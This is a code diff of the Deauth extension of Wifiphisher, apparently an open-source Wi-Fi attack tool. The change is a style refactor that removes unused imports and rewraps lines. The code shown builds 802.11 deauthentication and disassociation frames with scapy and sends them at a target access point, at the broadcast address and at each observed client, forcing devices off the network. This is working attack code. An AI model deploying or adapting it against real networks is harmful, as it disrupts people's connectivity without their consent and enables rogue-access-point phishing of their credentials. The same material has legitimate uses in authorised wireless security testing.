@@ -5,10 +5,7 @@ Extension that sends 3 DEAUTH/DISAS Frames:
  1 to the broadcast address
 """
 
-import threading
-import struct
 import scapy.layers.dot11 as dot11
-import scapy.arch.linux as linux
 import wifiphisher.common.constants as constants
 
 
@@ -36,7 +33,9 @@ class Deauth(object):
         self._data = data
 
         # Craft and add deauth/disas packet to broadcast address
-        self._craft_packet(self._data.target_ap_bssid, constants.WIFI_BROADCAST)
+        self._craft_packet(
+            self._data.target_ap_bssid,
+            constants.WIFI_BROADCAST)
 
     def _craft_packet(self, sender, receiver):
         """
@@ -53,13 +52,25 @@ class Deauth(object):
         :rtype: None
         """
 
-        deauth_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
-                    addr1=receiver, addr2=sender, addr3=self._data.target_ap_bssid) \
-                  / dot11.Dot11Deauth())
+        deauth_packet = (
+            dot11.RadioTap() /
+            dot11.Dot11(
+                type=0,
+                subtype=12,
+                addr1=receiver,
+                addr2=sender,
+                addr3=self._data.target_ap_bssid) /
+            dot11.Dot11Deauth())
 
-        disassoc_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=10, \
-                    addr1=receiver, addr2=sender, addr3=self._data.target_ap_bssid) \
-                  / dot11.Dot11Disas())  
+        disassoc_packet = (
+            dot11.RadioTap() /
+            dot11.Dot11(
+                type=0,
+                subtype=10,
+                addr1=receiver,
+                addr2=sender,
+                addr3=self._data.target_ap_bssid) /
+            dot11.Dot11Disas())
 
         return [disassoc_packet, deauth_packet]
 
@@ -99,8 +110,10 @@ class Deauth(object):
                     self._observed_clients.append(sender)
 
                     # create and add deauthentication packets for client
-                    deauth_pkts += self._craft_packet(sender, self._data.target_ap_bssid)
-                    deauth_pkts += self._craft_packet(self._data.target_ap_bssid, sender)
+                    deauth_pkts += self._craft_packet(sender,
+                                                      self._data.target_ap_bssid)
+                    deauth_pkts += self._craft_packet(
+                        self._data.target_ap_bssid, sender)
 
                 # in case the sender is the access point
                 elif sender == self._data.target_ap_bssid:
@@ -108,8 +121,10 @@ class Deauth(object):
                     self._observed_clients.append(receiver)
 
                     # create and add deauthentication packets for client
-                    deauth_pkts += self._craft_packet(receiver, self._data.target_ap_bssid)
-                    deauth_pkts += self._craft_packet(self._data.target_ap_bssid, receiver)
+                    deauth_pkts += self._craft_packet(
+                        receiver, self._data.target_ap_bssid)
+                    deauth_pkts += self._craft_packet(
+                        self._data.target_ap_bssid, receiver)
 
         return deauth_pkts
 
